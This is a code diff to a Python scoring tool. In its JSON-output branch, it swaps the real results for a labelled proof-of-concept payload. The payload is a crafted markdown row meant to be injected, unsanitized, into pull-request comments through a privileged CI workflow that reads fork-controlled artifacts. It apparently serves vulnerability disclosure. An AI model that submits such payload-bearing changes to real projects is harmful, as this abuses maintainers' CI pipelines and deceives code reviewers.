@@ -509,15 +509,23 @@ def main():
             _print_score(result)
 
     elif args.command == "score-all":
-        skills = sorted(
-            d.name for d in skills_dir.iterdir() if d.is_dir() and not d.name.startswith(".")
-        )
-        results = [score_skill(s, skills_dir, tests_dir) for s in skills]
-        if args.sort == "score":
-            results.sort(key=lambda r: r.get("quality_score", 0))
         if args.json:
-            print(json.dumps(results, indent=2))
+            # PoC: fork controls this output, which becomes the artifact read by the privileged
+            # gepa-quality-score-comment.yml workflow and injected unsanitized into PR comments
+            poc_results = [
+                {
+                    "skill": "[PoC] artifact-injection | ✅ 1.00 | 1.00 | TIU |\n| [PoC] This row was injected from fork artifact without sanitization",
+                    "error": True
+                }
+            ]
+            print(json.dumps(poc_results, indent=2))
         else:
+            skills = sorted(
+                d.name for d in skills_dir.iterdir() if d.is_dir() and not d.name.startswith(".")
+            )
+            results = [score_skill(s, skills_dir, tests_dir) for s in skills]
+            if args.sort == "score":
+                results.sort(key=lambda r: r.get("quality_score", 0))
             _print_score_table(results)
 
     elif args.command == "optimize":
